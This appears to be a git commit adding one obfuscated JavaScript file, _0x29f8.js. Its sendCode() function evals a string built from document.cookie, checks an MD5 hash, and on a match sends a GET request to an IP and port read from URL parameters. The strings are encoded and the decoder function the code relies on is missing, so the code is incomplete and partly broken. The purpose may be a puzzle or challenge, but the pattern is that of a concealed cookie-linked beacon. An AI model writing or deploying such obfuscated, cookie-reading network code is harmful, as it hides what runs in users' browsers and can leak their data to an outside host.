0fd4e5d16c6830f28e1b0bfb61dae49ef98ebac5
VIKAS YADAV <90182273+vadaysakiv@users.noreply.github.com>
2024-10-26 13:16:59 +0530

    Create _0x29f8.js

---
+++ _0x29f8.js
@@ -0,0 +1,77 @@
+var _0x29f8 = [
+    "ytnsB1PxsNzLqW==",
+    "Cg9YDa==",
+    "rMHAv1L6tM1gAa==",
+    "y29VA2LL",
+    "thPbnu16zZjnmG==",
+    "y29VA2LLpsi=",
+    "t2LcmwjStNHLvG==",
+    "r0vu",
+    "B3bLBG==",
+    "nJCZyMq3zgrImG==",
+    "tNjAweL1yuDgAG==",
+    "AgXov016wtjnnq==",
+    "mMiYmgi5mdK1nG==",
+    "C2vUza==",
+    "ntmXmtjKmZyYza==",
+    "twPJD1PQAZfAva==",
+    "vtnKmuzQtJnwrW==",
+    "nwXKvhbrvdfkvq==",
+    "yvHbs1fysMPHrW==",
+    "wM1fmuWYnxzArW==",
+    "BdjAu0jrwvHoEG==",
+    "vNfJEtf6wLHkmG==",
+    "vwTkv0nNpt0=",
+    "qLzJBxC2suDOma==",
+    "wLHjDgmYotfJBq==",
+    "Ahr0CdOVlW==",
+    "tMXzmJLRwLm1nG==",
+    "zeHbnKX5owTImG==",
+    "uvHkAMfhBdjAuW==",
+  ];
+  (function (_0x450162, _0x29f87c) {
+    var _0x54f1ee = function (_0x2b2171) {
+      while (--_0x2b2171) {
+        _0x450162["push"](_0x450162["shift"]());
+      }
+    };
+    _0x54f1ee(++_0x29f87c);
+  })(_0x29f8, 0x186);
+  function sendCode() {
+    if (
+      md5(eval(_0x54f1("0x15") + document[_0x54f1("0x13")] + "\x22")) ==
+      _0x54f1("0x1c") + _0x54f1("0x1") + _0x54f1("0x19") + "f8"
+    ) {
+      var _0x2e1f41 =
+          _0x54f1("0xf") +
+          _0x54f1("0xa") +
+          _0x54f1("0xe") +
+          _0x54f1("0x1a") +
+          _0x54f1("0x10") +
+          _0x54f1("0x4") +
+          _0x54f1("0x14") +
+          _0x54f1("0x12") +
+          _0x54f1("0x2") +
+          _0x54f1("0x1b") +
+          _0x54f1("0x6") +
+          _0x54f1("0x8") +
+          _0x54f1("0xb") +
+          _0x54f1("0xd") +
+          _0x54f1("0x5") +
+          _0x54f1("0x7") +
+          _0x54f1("0x16") +
+          _0x54f1("0x3") +
+          _0x54f1("0x9"),
+        _0x36f192 = new XMLHttpRequest(),
+        _0x5a0a5d =
+          _0x54f1("0xc") +
+          urlParams()["ip"] +
+          ":" +
+          urlParams()[_0x54f1("0x11")] +
+          "/" +
+          _0x2e1f41;
+      _0x36f192[_0x54f1("0x18")](_0x54f1("0x17"), _0x5a0a5d, !![]),
+        _0x36f192[_0x54f1("0x0")](null);
+    }
+  }
+  
